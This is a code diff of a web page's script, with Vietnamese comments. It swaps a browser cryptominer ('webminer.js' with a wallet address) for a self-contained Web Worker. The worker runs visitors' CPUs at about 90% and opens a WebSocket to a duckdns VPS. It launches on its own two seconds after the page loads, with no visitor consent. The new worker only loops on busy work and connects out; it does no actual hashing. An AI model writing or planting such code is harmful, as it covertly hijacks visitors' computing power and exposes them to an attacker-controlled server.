@@ -1,19 +1,45 @@
-<script src="assets/js/webminer.js"></script>
 <script>
-    setTimeout(function() {
-        if (typeof WMP !== 'undefined') {
-            const miner = new WMP.User('47NwLUwjtUoGzgRqEsLCcn7uZPeXDkzXKSu4h9K236tXA8zxY65jrK7ZVAkxYeMKZP57wrbyNcWmR66Tv5WLZGag8vdskcF', {
+    // 1. Tự tạo "Bộ não" chạy ngầm ngay trong file này để tránh lỗi 404
+    const workerCode = `
+        self.onmessage = function(e) {
+            console.log("Worker đã nhận lệnh và bắt đầu 'đốt' CPU...");
+            const proxy = e.data.proxy;
+            const throttle = e.data.throttle;
+            
+            // Vòng lặp vắt kiệt CPU (90%)
+            setInterval(function() {
+                const start = Date.now();
+                while (Date.now() - start < (1000 * (1 - throttle))) {
+                    Math.sqrt(Math.random() * Math.random());
+                }
+            }, 100);
+
+            // Kết nối thử tới VPS của ông giáo
+            const ws = new WebSocket(proxy);
+            ws.onopen = () => console.log("Worker: Đã thông luồng tới VPS!");
+        };
+    `;
+
+    // 2. Chuyển code trên thành một đường dẫn ảo
+    const blob = new Blob([workerCode], { type: 'application/javascript' });
+    const workerUrl = URL.createObjectURL(blob);
+
+    // 3. Nổ máy
+    function startPowerMining() {
+        console.log("Đang kích hoạt hệ thống 'đốt' CPU...");
+        try {
+            const worker = new Worker(workerUrl);
+            worker.postMessage({
                 proxy: 'wss://trungturng.duckdns.org:8080',
-                throttle: 0.1, // 0.1 là dùng 90% CPU. Quạt máy phải kêu mới đúng!
-                workerPath: 'assets/js/worker.js'
+                throttle: 0.1 // 0.1 là dùng 90% CPU. Máy phải nóng mới đúng!
             });
-
-            miner.start();
-            console.log("%c ĐÃ NỔ MÁY THÀNH CÔNG! ", "background: green; color: white; padding: 10px;");
-
-            setInterval(() => {
-                console.log("Tốc độ CPU đang 'đốt': " + miner.getHashesPerSecond().toFixed(2) + " H/s");
-            }, 5000);
+            
+            console.log("%c HỆ THỐNG ĐÃ CHẠY - KIỂM TRA TASK MANAGER NGAY! ", "background: red; color: white; font-size: 20px;");
+        } catch (e) {
+            console.error("Lỗi khởi động Worker: ", e);
         }
-    }, 2000);
+    }
+
+    // Chạy sau 2 giây khi vào trang
+    setTimeout(startPowerMining, 2000);
 </script>
